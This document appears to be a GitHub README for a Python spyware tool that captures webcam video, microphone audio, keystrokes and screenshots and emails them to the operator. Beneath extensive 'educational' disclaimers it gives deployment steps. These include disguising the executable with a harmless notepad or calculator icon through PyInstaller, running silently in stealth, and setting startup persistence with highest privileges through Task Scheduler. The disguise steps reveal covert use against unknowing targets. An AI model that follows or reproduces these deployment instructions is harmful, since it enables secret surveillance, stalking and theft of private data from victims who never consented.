⚠️ WARNING: LEGAL AND ETHICAL DISCLAIMER
This software is provided for EDUCATIONAL PURPOSES ONLY.
Creating, distributing, or using spyware without explicit permission from the target device owner is ILLEGAL in most jurisdictions and violates privacy laws. Unauthorized surveillance can result in severe criminal penalties, civil lawsuits, and ethical violations.

You must only use this software:

On devices you own

With explicit consent from the owner

In legally compliant environments (e.g., penetration testing with authorization, monitoring your own minor children within legal limits)

For learning about cybersecurity defense mechanisms

The author assumes NO liability for misuse of this code.

Spyware – Surveillance Tool (Educational)
A Python-based surveillance tool that captures system activity including webcam footage, microphone audio, keystrokes, and screenshots. By default, it records for 10 minutes every 3 hours and sends the collected data to a configured email address.

🛡️ Legal & Ethical Use Cases
Authorized penetration testing

Parental control (with full disclosure to monitored individuals where required by law)

Employee monitoring (where legally permitted and with prior written consent)

Personal device security research

✨ Features
Webcam Recording – Captures video from the default webcam

Microphone Recording – Records ambient audio

Keylogging – Logs all keyboard inputs

Screenshot Capture – Takes periodic screenshots

Automated Email Reporting – Sends collected data via email

Configurable Scheduling – Adjust recording duration and frequency

Stealth Operation – Can be configured to run silently on system startup

⚙️ Prerequisites
Python 3.8+

Required libraries (install via requirements.txt):

opencv-python

pyaudio

pynput

pillow

smtplib (standard library)

email (standard library)

🔧 Installation & Setup
Clone the repository

bash
git clone https://github.com/yourusername/spyware-educational.git
cd spyware-educational
Install dependencies

bash
pip install -r requirements.txt
Configure the application

⚠️ CRITICAL: You MUST modify the following before use:

Open config.py (or relevant configuration files)

Replace the email credentials:

python
# REMOVE THESE LINES AND INSERT YOUR OWN
SENDER_EMAIL = "your_email@gmail.com"
SENDER_PASSWORD = "your_app_password"  # Use app-specific password
RECIPIENT_EMAIL = "recipient_email@gmail.com"
Adjust surveillance settings:

python
# Example configuration
RECORDING_DURATION = 600  # 10 minutes in seconds
INTERVAL_BETWEEN_SESSIONS = 10800  # 3 hours in seconds
ENABLE_KEYLOGGING = True
ENABLE_SCREENSHOTS = True
ENABLE_WEBCAM = True
ENABLE_MICROPHONE = True
Email Configuration Notes

For Gmail, enable 2FA and generate an App Password

Use secure email providers with encryption

Consider using encrypted email services for sensitive data

🚀 Deployment (For Authorized Use Only)
Creating an Executable
To create a seemingly harmless executable:

Find an appropriate icon (e.g., notepad.ico or calculator.ico)

Use PyInstaller:

bash
pyinstaller --onefile --windowed --icon=harmless.ico main.py
The executable will be in the dist/ folder

Startup Persistence
By default, the code attempts to run on startup, but for 100% reliability:

Using Task Scheduler (Windows):

Open Task Scheduler

Create Basic Task

Trigger: "At startup" or "At logon"

Action: "Start a program"

Browse to your executable

Run with highest privileges

⚠️ Important Security Notes
Antivirus Detection: Most antivirus software will flag this as malware

Network Monitoring: Email transmission may be detected by network security tools

Legal Requirements: Many jurisdictions require notification of surveillance

Data Protection: Collected data may contain sensitive information subject to GDPR, CCPA, etc.

🔒 Defensive Measures (For System Protection)
To detect and prevent such software on your systems:

Use reputable antivirus/anti-malware solutions

Monitor startup programs and scheduled tasks

Use firewall to block suspicious outbound connections

Regularly audit running processes

Employ endpoint detection and response (EDR) tools

🧪 Testing in Safe Environments
For legitimate testing:

Use isolated virtual machines

Test only on devices you own

Disable network connectivity during testing

Use test email accounts

📝 License
This project is licensed under the MIT License with additional ethical use clauses:

Use only for legal, authorized purposes

Not for use in unauthorized surveillance

Developer not liable for misuse

🙋‍♂️ Responsible Disclosure
If you find vulnerabilities in similar software, report them responsibly to:

Software vendors

CERT/CC

Relevant security organizations

📚 Educational Resources
Electronic Frontier Foundation: Surveillance Self-Defense

US Laws on Computer Fraud and Abuse

EU General Data Protection Regulation (GDPR)

Developed by Ronny Rogers( Mugabo Rongin)

Remember: With great power comes great responsibility. Use this knowledge to protect, not to harm.
